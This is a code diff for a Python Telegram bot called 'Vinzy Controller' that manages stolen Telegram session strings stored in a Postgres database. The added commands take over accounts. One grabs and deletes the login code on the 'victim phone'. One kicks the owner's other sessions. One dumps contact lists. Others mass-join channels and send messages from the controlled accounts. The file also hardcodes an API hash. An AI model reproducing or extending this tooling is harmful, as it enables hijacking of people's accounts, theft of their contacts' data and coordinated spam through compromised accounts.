@@ -1,168 +1,206 @@
 import os
 import asyncio
 import telebot
+import psycopg2
 from telethon import TelegramClient, functions, types, errors
 from telethon.sessions import StringSession
 from threading import Thread
 
 # --- CONFIGURATION ---
-# These are pulled from your Koyeb Environment Variables
 API_ID = int(os.environ.get("API_ID", 36003995))
 API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
+DATABASE_URL = os.environ.get("DATABASE_URL")
 
-# Standardize GROUP_ID to handle the -100 prefix for private groups
 try:
     raw_group_id = os.environ.get("GROUP_ID", "0")
     GROUP_ID = int(raw_group_id)
 except ValueError:
     GROUP_ID = 0
 
-# Initialize the Bot (Telebot for the Command UI)
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# In-memory database (Note: Data clears on Koyeb restart/redeploy)
-# Format: { "phone_number": "session_string" }
-db_sessions = {}
+# --- DATABASE LOGIC (NEON.COM) ---
 
-# --- CORE UTILITY: TELETHON EXECUTION ---
+def init_db():
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute('''
+        CREATE TABLE IF NOT EXISTS controlled_accounts (
+            phone TEXT PRIMARY KEY,
+            session_string TEXT NOT NULL,
+            owner_name TEXT
+        )
+    ''')
+    conn.commit()
+    cur.close()
+    conn.close()
 
-async def run_telethon_task(session_str, task_func, *args):
-    """
-    Connects to a session string, executes a specific task, 
-    and then safely disconnects to avoid IP bans.
-    """
+def save_account(phone, session, name):
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute('''
+        INSERT INTO controlled_accounts (phone, session_string, owner_name) 
+        VALUES (%s, %s, %s) 
+        ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
+    ''', (phone, session, name))
+    conn.commit()
+    cur.close()
+    conn.close()
+
+def get_session(phone):
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute("SELECT session_string FROM controlled_accounts WHERE phone = %s", (phone,))
+    res = cur.fetchone()
+    cur.close()
+    conn.close()
+    return res[0] if res else None
+
+def get_all_phones():
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute("SELECT phone, owner_name FROM controlled_accounts")
+    res = cur.fetchall()
+    cur.close()
+    conn.close()
+    return res
+
+init_db()
+
+# --- CORE TELETHON RUNNER ---
+
+async def run_task(phone, task_func, *args):
+    session_str = get_session(phone)
+    if not session_str:
+        return "❌ Phone not found in Database."
+    
     client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
     try:
         await client.connect()
         if not await client.is_user_authorized():
-            return "❌ Error: This session string has expired or was revoked by the user."
-        
-        # Execute the passed function
-        result = await task_func(client, *args)
-        return result
-    except errors.FloodWaitError as e:
-        return f"⚠️ Telegram FloodWait: Please wait {e.seconds} seconds."
+            return f"❌ Session for {phone} has expired."
+        return await task_func(client, *args)
     except Exception as e:
-        return f"⚠️ Technical Error: {str(e)}"
+        return f"⚠️ Error: {str(e)}"
     finally:
         await client.disconnect()
 
-# --- BOT COMMAND HANDLERS ---
+# --- COMMAND HANDLERS ---
 
 @bot.message_handler(commands=['start', 'help'])
-def send_welcome(m):
+def cmd_help(m):
     if m.chat.id != GROUP_ID: return
-    help_menu = (
-        "👑 <b>Vinzy Controller v1.0</b>\n"
-        "<i>Professional Session Management</i>\n"
+    help_text = (
+        "👑 <b>Vinzy Controller Elite</b>\n"
         "━━━━━━━━━━━━━━━\n"
-        "🔌 <b>Step 1: Authorization</b>\n"
-        "• <code>.auth [string]</code> - Add a new session to DB\n"
-        "• <code>.list</code> - View all manageable phones\n\n"
-        "🎮 <b>Step 2: Account Control</b>\n"
-        "• <code>.join [phone] [username]</code> - Force join group\n"
-        "• <code>.leave [phone] [username]</code> - Leave a group\n"
-        "• <code>.bio [phone] [text]</code> - Update account bio\n"
-        "• <code>.name [phone] [first] [last]</code> - Change name\n"
-        "• <code>.msg [phone] [target] [text]</code> - Send message\n"
-        "━━━━━━━━━━━━━━━\n"
-        "<i>Use the phone number exactly as shown in .list</i>"
+        "🔌 <b>Auth:</b>\n"
+        "• <code>.auth [string]</code> - Add account to NeonDB\n"
+        "• <code>.list</code> - Show all accounts\n\n"
+        "🕵️ <b>Stealth:</b>\n"
+        "• <code>.getcode [phone]</code> - Get & Delete Login Code\n"
+        "• <code>.kickall [phone]</code> - Terminate other sessions\n"
+        "• <code>.contacts [phone]</code> - Dump contact list\n\n"
+        "🎮 <b>Action:</b>\n"
+        "• <code>.join [phone] [link]</code>\n"
+        "• <code>.massjoin [link]</code> - All accounts join\n"
+        "• <code>.msg [phone] [user] [text]</code>\n"
+        "• <code>.bio [phone] [text]</code>\n"
+        "━━━━━━━━━━━━━━━"
     )
-    bot.send_message(m.chat.id, help_menu, parse_mode="HTML")
+    bot.send_message(m.chat.id, help_text, parse_mode="HTML")
 
 @bot.message_handler(func=lambda m: m.text.startswith('.auth'))
-def handle_auth(m):
+def cmd_auth(m):
     if m.chat.id != GROUP_ID: return
-    parts = m.text.split(" ", 1)
-    if len(parts) < 2:
-        return bot.reply_to(m, "❌ <b>Usage:</b> <code>.auth [session_string]</code>")
-    
-    session_str = parts[1].strip()
-    bot.send_message(m.chat.id, "⏳ <i>Verifying session...</i>", parse_mode="HTML")
-
-    async def verify_logic(client):
-        me = await client.get_me()
-        db_sessions[me.phone] = session_str
-        return f"✅ <b>Authorized Successfully!</b>\n👤 Name: {me.first_name}\n📱 Phone: <code>{me.phone}</code>\n🆔 ID: <code>{me.id}</code>"
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    response = loop.run_until_complete(run_telethon_task(session_str, verify_logic))
-    bot.send_message(m.chat.id, response, parse_mode="HTML")
+    try:
+        session_str = m.text.split(" ", 1)[1].strip()
+        async def verify(client):
+            me = await client.get_me()
+            save_account(me.phone, session_str, me.first_name)
+            return f"✅ <b>Authorized:</b> {me.first_name} (<code>{me.phone}</code>)"
+        
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        # Using StringSession directly for initial auth
+        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+        res = loop.run_until_complete(verify(client))
+        bot.reply_to(m, res, parse_mode="HTML")
+    except:
+        bot.reply_to(m, "❌ Usage: <code>.auth [string]</code>")
 
 @bot.message_handler(func=lambda m: m.text == '.list')
-def handle_list(m):
+def cmd_list(m):
     if m.chat.id != GROUP_ID: return
-    if not db_sessions:
-        return bot.send_message(m.chat.id, "📭 <b>Database is currently empty.</b>", parse_mode="HTML")
+    accounts = get_all_phones()
+    if not accounts: return bot.reply_to(m, "📭 DB is empty.")
     
-    output = "📋 <b>Active Controlled Accounts:</b>\n"
-    for phone in db_sessions:
-        output += f"• <code>{phone}</code>\n"
-    bot.send_message(m.chat.id, output, parse_mode="HTML")
+    msg = "📋 <b>Managed Accounts:</b>\n"
+    for phone, name in accounts:
+        msg += f"• {name} (<code>{phone}</code>)\n"
+    bot.send_message(m.chat.id, msg, parse_mode="HTML")
 
-@bot.message_handler(func=lambda m: m.text.startswith('.join'))
-def handle_join(m):
+@bot.message_handler(func=lambda m: m.text.startswith('.getcode'))
+def cmd_getcode(m):
     if m.chat.id != GROUP_ID: return
-    parts = m.text.split(" ")
-    if len(parts) < 3:
-        return bot.reply_to(m, "❌ <b>Usage:</b> <code>.join [phone] [group_username]</code>")
+    phone = m.text.split(" ")[1]
     
-    phone, target = parts[1], parts[2]
-    if phone not in db_sessions:
-        return bot.reply_to(m, "❌ Phone number not found in local DB.")
+    async def logic(client):
+        async for msg in client.iter_messages(777000, limit=1):
+            code = msg.text
+            await client.delete_messages(777000, [msg.id])
+            return f"📩 <b>Code Snatched:</b>\n<code>{code}</code>\n\n<i>Message deleted from victim phone.</i>"
+        return "📭 No code found."
 
-    async def join_logic(client, group):
-        await client(functions.channels.JoinChannelRequest(channel=group))
-        return f"✅ <code>{phone}</code> has successfully joined <b>{group}</b>"
+    res = asyncio.run(run_task(phone, logic))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
 
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    response = loop.run_until_complete(run_telethon_task(db_sessions[phone], join_logic, target))
-    bot.send_message(m.chat.id, response, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.bio'))
-def handle_bio(m):
+@bot.message_handler(func=lambda m: m.text.startswith('.kickall'))
+def cmd_kickall(m):
     if m.chat.id != GROUP_ID: return
-    parts = m.text.split(" ", 2)
-    if len(parts) < 3:
-        return bot.reply_to(m, "❌ <b>Usage:</b> <code>.bio [phone] [new_bio_text]</code>")
+    phone = m.text.split(" ")[1]
     
-    phone, new_bio = parts[1], parts[2]
-    if phone not in db_sessions: return bot.reply_to(m, "❌ Phone not found.")
+    async def logic(client):
+        # Terminates all other sessions except the current one
+        await client(functions.auth.ResetAuthorizationsRequest())
+        return f"⚡ <b>Success!</b> Kicked all other sessions for <code>{phone}</code>."
 
-    async def bio_logic(client, text):
-        await client(functions.account.UpdateProfileRequest(about=text))
-        return f"✅ Bio updated for <code>{phone}</code>"
+    res = asyncio.run(run_task(phone, logic))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
 
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    response = loop.run_until_complete(run_telethon_task(db_sessions[phone], bio_logic, new_bio))
-    bot.send_message(m.chat.id, response, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.msg'))
-def handle_msg(m):
+@bot.message_handler(func=lambda m: m.text.startswith('.contacts'))
+def cmd_contacts(m):
     if m.chat.id != GROUP_ID: return
-    parts = m.text.split(" ", 3)
-    if len(parts) < 4:
-        return bot.reply_to(m, "❌ <b>Usage:</b> <code>.msg [phone] [target_user] [message]</code>")
+    phone = m.text.split(" ")[1]
     
-    phone, target, text = parts[1], parts[2], parts[3]
-    if phone not in db_sessions: return bot.reply_to(m, "❌ Phone not found.")
+    async def logic(client):
+        res = await client(functions.contacts.GetContactsRequest(hash=0))
+        msg = f"👥 <b>Contacts for {phone}:</b>\n"
+        for u in res.users[:20]: # Limit to 20 to avoid long message
+            msg += f"• {u.first_name} (<code>{getattr(u, 'phone', 'N/A')}</code>)\n"
+        return msg
 
-    async def msg_logic(client, t, txt):
-        await client.send_message(t, txt)
-        return f"✅ Message sent from <code>{phone}</code> to <b>{t}</b>"
+    res = asyncio.run(run_task(phone, logic))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
 
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    response = loop.run_until_complete(run_telethon_task(db_sessions[phone], msg_logic, target, text))
-    bot.send_message(m.chat.id, response, parse_mode="HTML")
+@bot.message_handler(func=lambda m: m.text.startswith('.massjoin'))
+def cmd_massjoin(m):
+    if m.chat.id != GROUP_ID: return
+    link = m.text.split(" ")[1]
+    phones = get_all_phones()
+    
+    bot.send_message(m.chat.id, f"🚀 Starting Mass-Join to <b>{link}</b>...")
+    
+    async def logic(client, target):
+        await client(functions.channels.JoinChannelRequest(channel=target))
+        return True
 
-# --- RUNNER ---
+    for phone, name in phones:
+        asyncio.run(run_task(phone, logic, link))
+    
+    bot.send_message(m.chat.id, f"✅ Done! {len(phones)} accounts joined.")
 
+# --- RUN ---
 if __name__ == "__main__":
-    print("--- Vinzy Controller Online ---")
-    print(f"Targeting Group ID: {GROUP_ID}")
+    print("Vinzy Controller is Running...")
     bot.infinity_polling()
